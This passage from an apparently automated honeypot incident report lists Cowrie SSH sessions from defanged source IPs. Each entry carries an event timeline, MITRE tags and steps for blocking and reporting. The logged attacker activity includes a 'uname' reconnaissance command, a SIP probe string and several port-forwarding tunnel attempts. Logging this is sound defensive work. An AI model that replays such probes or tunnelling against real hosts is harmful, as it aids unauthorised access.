| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:16:12` | `cowrie.session.connect` |
| `2026-08-09 10:16:12` | `cowrie.login.success` |
| `2026-08-09 10:16:13` | `cowrie.session.params` |
| `2026-08-09 10:16:13` | `cowrie.command.input` |
| `2026-08-09 10:16:13` | `cowrie.command.failed` |
| `2026-08-09 10:16:13` | `cowrie.command.input` |
| `2026-08-09 10:16:13` | `cowrie.command.failed` |
| `2026-08-09 10:16:13` | `cowrie.command.input` |
| `2026-08-09 10:16:13` | `cowrie.command.failed` |
| `2026-08-09 10:16:13` | `cowrie.command.input` |
| `2026-08-09 10:16:13` | `cowrie.command.failed` |
| `2026-08-09 10:16:13` | `cowrie.command.input` |
| `2026-08-09 10:16:13` | `cowrie.command.failed` |
| `2026-08-09 10:16:13` | `cowrie.command.input` |
| `2026-08-09 10:16:13` | `cowrie.command.failed` |
| `2026-08-09 10:16:13` | `cowrie.command.input` |
| `2026-08-09 10:16:13` | `cowrie.command.failed` |
| `2026-08-09 10:16:13` | `cowrie.command.input` |
| `2026-08-09 10:16:13` | `cowrie.command.failed` |
| `2026-08-09 10:16:13` | `cowrie.command.input` |
| `2026-08-09 10:16:20` | `cowrie.log.closed` |
| `2026-08-09 10:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca389cdd31b9

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:16 |
| **Last Seen** | 2026-08-09 10:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:16:17` | `cowrie.session.connect` |
| `2026-08-09 10:16:17` | `cowrie.login.success` |
| `2026-08-09 10:16:18` | `cowrie.session.params` |
| `2026-08-09 10:16:18` | `cowrie.command.input` |
| `2026-08-09 10:16:18` | `cowrie.command.failed` |
| `2026-08-09 10:16:18` | `cowrie.command.input` |
| `2026-08-09 10:16:18` | `cowrie.command.failed` |
| `2026-08-09 10:16:18` | `cowrie.command.input` |
| `2026-08-09 10:16:18` | `cowrie.command.failed` |
| `2026-08-09 10:16:18` | `cowrie.command.input` |
| `2026-08-09 10:16:18` | `cowrie.command.failed` |
| `2026-08-09 10:16:18` | `cowrie.command.input` |
| `2026-08-09 10:16:18` | `cowrie.command.failed` |
| `2026-08-09 10:16:18` | `cowrie.command.input` |
| `2026-08-09 10:16:18` | `cowrie.command.failed` |
| `2026-08-09 10:16:18` | `cowrie.command.input` |
| `2026-08-09 10:16:18` | `cowrie.command.failed` |
| `2026-08-09 10:16:18` | `cowrie.command.input` |
| `2026-08-09 10:16:18` | `cowrie.command.failed` |
| `2026-08-09 10:16:18` | `cowrie.command.input` |
| `2026-08-09 10:16:25` | `cowrie.log.closed` |
| `2026-08-09 10:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a350556cff0

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:16 |
| **Last Seen** | 2026-08-09 10:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:16:17` | `cowrie.session.connect` |
| `2026-08-09 10:16:18` | `cowrie.login.success` |
| `2026-08-09 10:16:19` | `cowrie.session.params` |
| `2026-08-09 10:16:19` | `cowrie.command.input` |
| `2026-08-09 10:16:19` | `cowrie.command.failed` |
| `2026-08-09 10:16:19` | `cowrie.command.input` |
| `2026-08-09 10:16:19` | `cowrie.command.failed` |
| `2026-08-09 10:16:19` | `cowrie.command.input` |
| `2026-08-09 10:16:19` | `cowrie.command.failed` |
| `2026-08-09 10:16:19` | `cowrie.command.input` |
| `2026-08-09 10:16:19` | `cowrie.command.failed` |
| `2026-08-09 10:16:19` | `cowrie.command.input` |
| `2026-08-09 10:16:19` | `cowrie.command.failed` |
| `2026-08-09 10:16:19` | `cowrie.command.input` |
| `2026-08-09 10:16:19` | `cowrie.command.failed` |
| `2026-08-09 10:16:19` | `cowrie.command.input` |
| `2026-08-09 10:16:19` | `cowrie.command.failed` |
| `2026-08-09 10:16:19` | `cowrie.command.input` |
| `2026-08-09 10:16:19` | `cowrie.command.failed` |
| `2026-08-09 10:16:19` | `cowrie.command.input` |
| `2026-08-09 10:16:25` | `cowrie.log.closed` |
| `2026-08-09 10:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21f07a62ebda

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-09 10:16 |
| **Last Seen** | 2026-08-09 10:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:16:31` | `cowrie.session.connect` |
| `2026-08-09 10:16:31` | `cowrie.client.version` |
| `2026-08-09 10:16:31` | `cowrie.client.kex` |
| `2026-08-09 10:16:31` | `cowrie.login.success` |
| `2026-08-09 10:16:31` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:16:31` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40be915c0bf1

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:17 |
| **Last Seen** | 2026-08-09 10:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:17:01` | `cowrie.session.connect` |
| `2026-08-09 10:17:01` | `cowrie.login.success` |
| `2026-08-09 10:17:01` | `cowrie.session.params` |
| `2026-08-09 10:17:06` | `cowrie.log.closed` |
| `2026-08-09 10:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d3a55359c00

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:17 |
| **Last Seen** | 2026-08-09 10:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:17:06` | `cowrie.session.connect` |
| `2026-08-09 10:17:06` | `cowrie.login.success` |
| `2026-08-09 10:17:06` | `cowrie.session.params` |
| `2026-08-09 10:17:11` | `cowrie.log.closed` |
| `2026-08-09 10:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fbc7e3e414b

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:17 |
| **Last Seen** | 2026-08-09 10:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:17:06` | `cowrie.session.connect` |
| `2026-08-09 10:17:06` | `cowrie.login.success` |
| `2026-08-09 10:17:07` | `cowrie.session.params` |
| `2026-08-09 10:17:11` | `cowrie.log.closed` |
| `2026-08-09 10:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e0dbe467d6

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:17 |
| **Last Seen** | 2026-08-09 10:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:17:06` | `cowrie.session.connect` |
| `2026-08-09 10:17:07` | `cowrie.login.success` |
| `2026-08-09 10:17:08` | `cowrie.session.params` |
| `2026-08-09 10:17:08` | `cowrie.command.input` |
| `2026-08-09 10:17:11` | `cowrie.log.closed` |
| `2026-08-09 10:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16f75265ad8a

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:17 |
| **Last Seen** | 2026-08-09 10:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:17:11` | `cowrie.session.connect` |
| `2026-08-09 10:17:11` | `cowrie.login.success` |
| `2026-08-09 10:17:11` | `cowrie.session.params` |
| `2026-08-09 10:17:11` | `cowrie.command.input` |
| `2026-08-09 10:17:16` | `cowrie.log.closed` |
| `2026-08-09 10:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cdd74a4a82e

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:17 |
| **Last Seen** | 2026-08-09 10:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:17:11` | `cowrie.session.connect` |
| `2026-08-09 10:17:11` | `cowrie.login.success` |
| `2026-08-09 10:17:12` | `cowrie.session.params` |
| `2026-08-09 10:17:12` | `cowrie.command.input` |
| `2026-08-09 10:17:16` | `cowrie.log.closed` |
| `2026-08-09 10:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6000141200f2

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]175` |
| **First Seen** | 2026-08-09 10:17 |
| **Last Seen** | 2026-08-09 10:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:17:48` | `cowrie.session.connect` |
| `2026-08-09 10:17:48` | `cowrie.client.version` |
| `2026-08-09 10:17:50` | `cowrie.client.kex` |
| `2026-08-09 10:17:51` | `cowrie.login.success` |
| `2026-08-09 10:17:51` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:17:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:17:52` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290eb2987d67

| Field | Detail |
|---|---|
| **Source IP** | `120.26.229[.]104` |
| **First Seen** | 2026-08-09 10:19 |
| **Last Seen** | 2026-08-09 10:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:19:11` | `cowrie.session.connect` |
| `2026-08-09 10:19:12` | `cowrie.client.version` |
| `2026-08-09 10:19:12` | `cowrie.client.kex` |
| `2026-08-09 10:19:13` | `cowrie.login.success` |
| `2026-08-09 10:19:15` | `cowrie.session.params` |
| `2026-08-09 10:19:15` | `cowrie.command.input` |
| `2026-08-09 10:19:16` | `cowrie.log.closed` |
| `2026-08-09 10:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.26.229[.]104` to AbuseIPDB if not already reported
- [ ] Block `120.26.229[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eec768d7520

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]175` |
| **First Seen** | 2026-08-09 10:19 |
| **Last Seen** | 2026-08-09 10:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:19:51` | `cowrie.session.connect` |
| `2026-08-09 10:19:51` | `cowrie.client.version` |
| `2026-08-09 10:19:51` | `cowrie.client.kex` |
| `2026-08-09 10:19:52` | `cowrie.login.success` |
| `2026-08-09 10:19:52` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:19:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:19:53` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7043d384cacf

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-09 10:21 |
| **Last Seen** | 2026-08-09 10:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:21:03` | `cowrie.session.connect` |
| `2026-08-09 10:21:03` | `cowrie.client.version` |
| `2026-08-09 10:21:03` | `cowrie.client.kex` |
| `2026-08-09 10:21:04` | `cowrie.login.success` |
| `2026-08-09 10:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e410d08fa84

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-09 10:21 |
| **Last Seen** | 2026-08-09 10:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:21:03` | `cowrie.session.connect` |
| `2026-08-09 10:21:03` | `cowrie.client.version` |
| `2026-08-09 10:21:03` | `cowrie.client.kex` |
| `2026-08-09 10:21:04` | `cowrie.login.success` |
| `2026-08-09 10:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a41a8a66d49e

| Field | Detail |
|---|---|
| **Source IP** | `116.110.215[.]21` |
| **First Seen** | 2026-08-09 10:25 |
| **Last Seen** | 2026-08-09 10:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:25:30` | `cowrie.session.connect` |
| `2026-08-09 10:25:31` | `cowrie.client.version` |
| `2026-08-09 10:25:31` | `cowrie.client.kex` |
| `2026-08-09 10:25:38` | `cowrie.login.success` |
| `2026-08-09 10:25:39` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:25:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:25:41` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.215[.]21` to AbuseIPDB if not already reported
- [ ] Block `116.110.215[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c79cc6f407f

| Field | Detail |
|---|---|
| **Source IP** | `116.110.215[.]21` |
| **First Seen** | 2026-08-09 10:26 |
| **Last Seen** | 2026-08-09 10:28 |
| **Session Duration** | 104s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:26:48` | `cowrie.session.connect` |
| `2026-08-09 10:26:48` | `cowrie.client.version` |
| `2026-08-09 10:27:03` | `cowrie.client.kex` |
| `2026-08-09 10:28:15` | `cowrie.login.success` |
| `2026-08-09 10:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.215[.]21` to AbuseIPDB if not already reported
- [ ] Block `116.110.215[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d870d3bd729c

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-09 10:27 |
| **Last Seen** | 2026-08-09 10:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:27:29` | `cowrie.session.connect` |
| `2026-08-09 10:27:30` | `cowrie.client.version` |
| `2026-08-09 10:27:30` | `cowrie.client.kex` |
| `2026-08-09 10:27:33` | `cowrie.login.success` |
| `2026-08-09 10:27:34` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9d0c5bda469

| Field | Detail |
|---|---|
| **Source IP** | `49.124.147[.]100` |
| **First Seen** | 2026-08-09 10:27 |
| **Last Seen** | 2026-08-09 10:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:27:47` | `cowrie.session.connect` |
| `2026-08-09 10:27:48` | `cowrie.client.version` |
| `2026-08-09 10:27:48` | `cowrie.client.kex` |
| `2026-08-09 10:27:49` | `cowrie.login.success` |
| `2026-08-09 10:27:50` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.147[.]100` to AbuseIPDB if not already reported
- [ ] Block `49.124.147[.]100` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d66efa615cb5

| Field | Detail |
|---|---|
| **Source IP** | `116.110.211[.]135` |
| **First Seen** | 2026-08-09 10:32 |
| **Last Seen** | 2026-08-09 10:33 |
| **Session Duration** | 70s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:32:25` | `cowrie.session.connect` |
| `2026-08-09 10:32:29` | `cowrie.client.version` |
| `2026-08-09 10:32:33` | `cowrie.client.kex` |
| `2026-08-09 10:32:47` | `cowrie.login.success` |
| `2026-08-09 10:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.211[.]135` to AbuseIPDB if not already reported
- [ ] Block `116.110.211[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a6f02aaaa5b

| Field | Detail |
|---|---|
| **Source IP** | `116.110.211[.]135` |
| **First Seen** | 2026-08-09 10:33 |
| **Last Seen** | 2026-08-09 10:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:33:57` | `cowrie.session.connect` |
| `2026-08-09 10:33:57` | `cowrie.client.version` |
| `2026-08-09 10:33:57` | `cowrie.client.kex` |
| `2026-08-09 10:33:59` | `cowrie.login.success` |
| `2026-08-09 10:33:59` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:34:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:34:00` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.211[.]135` to AbuseIPDB if not already reported
- [ ] Block `116.110.211[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18c38c9dc63c

| Field | Detail |
|---|---|
| **Source IP** | `116.110.211[.]135` |
| **First Seen** | 2026-08-09 10:36 |
| **Last Seen** | 2026-08-09 10:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:36:00` | `cowrie.session.connect` |
| `2026-08-09 10:36:00` | `cowrie.client.version` |
| `2026-08-09 10:36:01` | `cowrie.client.kex` |
| `2026-08-09 10:36:02` | `cowrie.login.success` |
| `2026-08-09 10:36:03` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:36:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:36:04` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.211[.]135` to AbuseIPDB if not already reported
- [ ] Block `116.110.211[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e28703bb14eb

| Field | Detail |
|---|---|
| **Source IP** | `116.110.211[.]135` |
| **First Seen** | 2026-08-09 10:38 |
| **Last Seen** | 2026-08-09 10:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:38:05` | `cowrie.session.connect` |
| `2026-08-09 10:38:05` | `cowrie.client.version` |
| `2026-08-09 10:38:05` | `cowrie.client.kex` |
| `2026-08-09 10:38:07` | `cowrie.login.success` |
| `2026-08-09 10:38:08` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:38:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:38:08` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.211[.]135` to AbuseIPDB if not already reported
- [ ] Block `116.110.211[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58db44d035f9

| Field | Detail |
|---|---|
| **Source IP** | `62.183.82[.]70` |
| **First Seen** | 2026-08-09 10:39 |
| **Last Seen** | 2026-08-09 10:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:39:03` | `cowrie.session.connect` |
| `2026-08-09 10:39:04` | `cowrie.client.version` |
| `2026-08-09 10:39:04` | `cowrie.client.kex` |
| `2026-08-09 10:39:05` | `cowrie.login.success` |
| `2026-08-09 10:39:05` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.183.82[.]70` to AbuseIPDB if not already reported
- [ ] Block `62.183.82[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fec40d05c648

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-08-09 10:39 |
| **Last Seen** | 2026-08-09 10:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:39:14` | `cowrie.session.connect` |
| `2026-08-09 10:39:15` | `cowrie.client.version` |
| `2026-08-09 10:39:15` | `cowrie.client.kex` |
| `2026-08-09 10:39:17` | `cowrie.login.success` |
| `2026-08-09 10:39:17` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
